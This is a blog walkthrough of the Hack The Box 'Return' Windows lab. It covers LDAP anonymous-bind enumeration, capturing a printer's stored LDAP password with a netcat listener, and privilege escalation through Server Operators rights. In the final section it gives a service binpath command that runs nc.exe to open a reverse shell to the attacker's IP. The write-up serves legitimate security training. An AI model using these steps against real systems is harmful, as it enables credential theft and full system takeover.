+++
title = "Return HTB Box Walkthrough"
author = "bloodstiller"
tags = ["Box", "HTB", "Easy", "Windows", "LDAP"]
draft = false
+++



## Name of box: - Return: {#name-of-box-return}


### Initial NMAP Scan &amp; Start-Up Responder: {#initial-nmap-scan-and-start-up-responder}

-   I tend to run a very basic nmap scan initially so I can look for low hanging fruit that I can enumerate whilst my more in-depth scans are running:
    -   In this case it's very useful as we can see that ldap is runing which means we can do a significant amount of enumeration if anonymous bind is enabled.
        ```Shell
        kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 11:12:51 zsh ❯ nmap $box
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 11:23 BST
        Nmap scan report for 10.129.95.241
        Host is up (0.035s latency).
        Not shown: 988 closed tcp ports (conn-refused)
        PORT     STATE SERVICE
        53/tcp   open  domain
        80/tcp   open  http
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds


        ```

-   Start Responder:
    -   As this is a windows domain computer, I start responder running in the background. The liklihood of me getting any hits on a single box are slim but we dont' know if it's been set to call out.
        ```shell
              kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
              🕙 11:13:40 zsh ❯ sudo responder -wd -v -I tun0
              [sudo] password for kali:
        ```
        \_\_


### Domain Name Discovery: {#domain-name-discovery}

-   Domain Name is `return.local`
-   Whilst my NMAP Scan runs I use ldapsearch to discover the naming contexts of the domain, doing this enables me to check for further fine grained information.
    ```shell
        kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 11:13:51 zsh ❯ ldapsearch -H ldap://$box -x -s base namingcontexts
        # extended LDIF
        #
        # LDAPv3
        # base <> (default) with scope baseObject
        # filter: (objectclass=*)
        # requesting: namingcontexts
        #

        #
        dn:
        namingcontexts: DC=return,DC=local
        namingcontexts: CN=Configuration,DC=return,DC=local
        namingcontexts: CN=Schema,CN=Configuration,DC=return,DC=local
        namingcontexts: DC=DomainDnsZones,DC=return,DC=local
        namingcontexts: DC=ForestDnsZones,DC=return,DC=local

        # search result
        search: 2
        result: 0 Success

        # numResponses: 2
        # numEntries: 1
    ```
-   Brief explanation of naming contexts:
    -   Every Active Directory domain has a naming context (NC). The root of the naming context is represented by the domains distinguised name (DN/dn). This is often referred to as the "NC Head". For example in this case, the `return.local` domain DN would be "DC=return,DC=local" as can be seen in the first returned line. This is the root of the directory that all other DN's will be built on top of, e.g. if we had a user called Lex Huberman, their DN may be "CN=lex.huberman,CN=Users,DC=return,DC=local" (we can see the NC is the base/root that all other DN's for the domain are built upon.)


### Checking For Ldap Anonymous bind: {#checking-for-ldap-anonymous-bind}

-   As we are dealing with ldap, as mentioned previously, I want to check if Anonymous Bind is enabled.
    -   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
        -   We can actually retrieve a significant amount of information via anonymous bind such as:
            -   A list of all users
            -   A list of all groups
            -   A list of all computers.
            -   User account attributes.
            -   The domain password policy.
            -   Enumerate users who are susceptible to AS-REPRoasting.
            -   Passwords stored in the description fields
        -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
               kali in ~/Desktop/WindowsTools 🐍 v3.11.9  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
               🕙 11:31:36 zsh ✖  python3 ldapchecker.py $box
               Attempting to connect to 10.129.95.241 with SSL...
               Failed to connect with SSL. Retrying without SSL...
               Connected successfully. Retrieving server information...
               DSA info (from DSE):
                  Supported LDAP versions: 3, 2
                    Naming contexts:
                      DC=return,DC=local
                      CN=Configuration,DC=return,DC=local
                      CN=Schema,CN=Configuration,DC=return,DC=local
                      DC=DomainDnsZones,DC=return,DC=local
                      DC=ForestDnsZones,DC=return,DC=local
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
               Other:
               domainFunctionality:
                 7
               forestFunctionality:
                 7
               domainControllerFunctionality:
                 7
               rootDomainNamingContext:
                 DC=return,DC=local
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   Note that any host os can used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   Note:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) So it appears it's a printer server site of some sort. What is also interesting is the CN name "Configuration", this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security stanards actioned.
            ```shell
                    serverName:
                      CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=return,DC=local
                    schemaNamingContext:
            ```

-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.
    -   But wait there's more&#x2026;.


### Enumerating the Webserver &amp; Getting a foothold: {#enumerating-the-webserver-and-getting-a-foothold}

-   We can see a webserver running on the host:
    -   {{< figure src="/ox-hugo/2024-08-31-084657_.png" >}}
-   This is interesting as it's a domain joined printer and this is the admin/settings page. For this printer to be able to operate and be used on the domain, it will have credentials stored. So we should be able to extract these.
-   I stand up an nc listener &amp; listen on ldap port `389`
    -   `sudo nc -lvnp 389`
    -   I then enter my email address and click "Update"
    -   I immediately get a connection anda  password is displayed.
        -   {{< figure src="/ox-hugo/2024-08-31-085401_.png" >}}
    -   <span class="underline">I verify the password is valid using netexec</span>:
        -   {{< figure src="/ox-hugo/2024-08-31-085727_.png" >}}


#### Ldap Bind Information: {#ldap-bind-information}

-   I had wireshark running at this time to capture any interesting traffic &amp; here we can see the `POST` request from the server &amp; the subsequent `LDAP BIND REQUEST` to our malicious server.
    -   {{< figure src="/ox-hugo/2024-09-01-095413_.png" >}}
    -   We can actually gather a significant amount of information from this packet.
        1.  The version of LDAP being used.
            -   This particular printer is using 2, however the most recent version is 3.
        2.  The name of the client/user making the request:
            -   `return\svc-printer`
        3.  The Authentication method:
            -   `(0) Simple` aka as clear text passwords.
    -   {{< figure src="/ox-hugo/2024-09-01-095817_.png" >}}


### I connect to the host via Evil-Winrm: {#i-connect-to-the-host-via-evil-winrm}

-   I want to be fully transparent here, I didn't go straight to checking evil-winrm and connecting. Instead I messed around with SMB and enumerating the shares, which is not a bad thing but I should have realistically checked for this earlier. I hear you say "but why are you telling me this?" well, there are a lot of videos and writeups for boxes where people go "I did A,B,C &amp; that's how I owned this box in 3 minutes flat" but that's not the reality of it, and it sets unrealistic expectations for people. In reality, you try various things and they fail and then you realize you missed something and do that. Granted this will improve with time and methodology however It's not true when you are starting out &amp; that is okay.

-   I connect &amp; check my users privs:
-   {{< figure src="/ox-hugo/2024-08-31-092915_.png" >}}
-   I can see that I have the `SeBackupPrivilege` which effectivley means I have `NT AUTHORITY SYSTEM`.
-   I check my group membership and can see I am part of the `Server Operators`:
    -   {{< figure src="/ox-hugo/2024-09-01-100535_.png" >}}
    -   This is a high-privileged group:

-   The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. **It is a very highly privileged group that can log in locally to servers, including Domain Controllers.**
    -   We get the below capabilites by being part of this group:
        -   Interactive sign-in to servers.
        -   Create and delete network shared resources.
        -   Start and stop services.
        -   Back up and restore files.
            -   As seen in `SeBackupPrivilege` &amp; `SeRestorePrivilege`
        -   Format the hard disk drive.
        -   Shut down the computer.


#### "why `SeBackupPrivilege` is dangerous: {#why-sebackupprivilege-is-dangerous}

-   Here is why `SeBackupPrivilege` is so dangerous if we control a user who has the privilege:
-   The privilege will let us copy ANY file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL)
-   However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag. E.G. Use Diskshadow.exe
    -   Some more fun facts about this privilege:
    -   **Members of the** [Backup Operators Group](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators)  **&amp;** [Server Operators Group](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators) **get this privilege by default**:
    -   Provides read access to all files and directories for backup purposes, bypassing standard permissions.
        -   Allows a process to read any file, regardless of the file's permissions.
        -   Used primarily for backup applications that need access to all files.
        -   Does not enable writing or deleting files, only reading.
    -   Security Considerations
        -   High potential for abuse if granted to unauthorized applications or users.
        -   Should be closely monitored and restricted to trusted applications and personnel.


### Path to NT Authority\System course correction: {#path-to-nt-authority-system-course-correction}

-   Inititally I actually went down the path of dumping the registry hives for a `SAM` attack. As we do not have access to an actual domain controller so a DC Sync/Dumping `NTDS.dit` attack was no feasible. Just getting NT Locally would be enough to meet our needs. However when performing this attack I was successul in extracting the administrators hash but all pass the hash attacks (PTH) and attempts to login is as the administrator would not work, so the account login must be restricted locally.
-   So now it's a case of looking at the other capabilites that we have as members of the "Server Operators" Group, e.g. the ability to start &amp; stop processes.


### Enumerating Services: {#enumerating-services}

-   I try various ways to enumerate the processes &amp; services manually using inbuilt tools in windows, however these are all denied.
-   **Processes**:
    -   {{< figure src="/ox-hugo/2024-09-01-105215_.png" >}}
-   **Services**:
    -   {{< figure src="/ox-hugo/2024-09-01-110052_.png" >}}
-   **Trying SharpUp**:
    -   {{< figure src="/ox-hugo/2024-09-01-110707_.png" >}}
-   **Evil-Winrm**:
    -   I didn't know this previously bu as we are using evil-winrm it has the ability to enumerate services that are running by running the `services` command even if other methods do not work.
        -   {{< figure src="/ox-hugo/2024-09-01-105457_.png" >}}
        -   Here we can see that the `VGAutheService.exe` binary is running as a privileged user/NT Authority System and the service name is `VGAuthService`
    -   I tried to enumerate if the service path was modifiable but all my efforts were denied. I am going to attempt to attack it anyway.
        -   I was able to query if I could stop it, which I can:
            -   {{< figure src="/ox-hugo/2024-09-01-120709_.png" >}}


### Attacking the Bin Path &amp; Getting System: {#attacking-the-bin-path-and-getting-system}

-   I am going to see if I can modify the binaries path to point to a binary I control, e.g. NC or a reverse shell. I will then stop the service &amp; restart it again. As the service runs as NT Authority\System it should run my binary with elevate privileges.
    -   **Note**: Sometimes this is what it is, trying until we find the right route.


1.  **Upload my binary, nc.exe**
    -   {{< figure src="/ox-hugo/2024-09-01-120741_.png" >}}
2.  **Stand up my listener**:
    -   {{< figure src="/ox-hugo/2024-09-01-120402_.png" >}}
3.  **Stop the process &amp; ensure it has stopped**:
    -   {{< figure src="/ox-hugo/2024-09-01-120824_.png" >}}
4.  **Modify the binary path to have cmd execute my nc.exe binary and connect back to my attack host**:
    -   {{< figure src="/ox-hugo/2024-09-01-120912_.png" >}}
    -   _**Explained**_:
        -   Initially I did just have the binpath be:
            -   `sc.exe config VGAuthService binpath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.131 9999"`
            -   However it kept failing. After doing some digging I found out why.
                -   If we start a service process it **will** fail if the service **MUST** is not a Windows Service; which means the reverse shell will fail. Instead if we have cmd launch and then run our reverse shell even if the service fails our reverse shell will persist as it will be backgrounded.
                -   Information here: <https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN>
5.  Start the process:
    -   {{< figure src="/ox-hugo/2024-09-01-120942_.png" >}}
6.  Profit
    -   {{< figure src="/ox-hugo/2024-09-01-121010_.png" >}}
    -   {{< figure src="/ox-hugo/2024-09-01-121248_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned how to extract hardcoded LDAP credentials from hosts by using a malicious LDAP server.
2.  I learned that we can enumerate running services using evil-winrm.
3.  I learned that if we modify a service to run a custom binary it will fail unless we execute it using cmd as services will fail if they are not a Windows Service.
    -   Information here: <https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN>


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  I did not try and connect with Evil-Winrm sooner, this isn't a terrible mistake as I was acively enumerating SMB but it is low hangin fruit that I could have seen sooner.
2.  I initially went after a local admin account, however this was not the right path to take.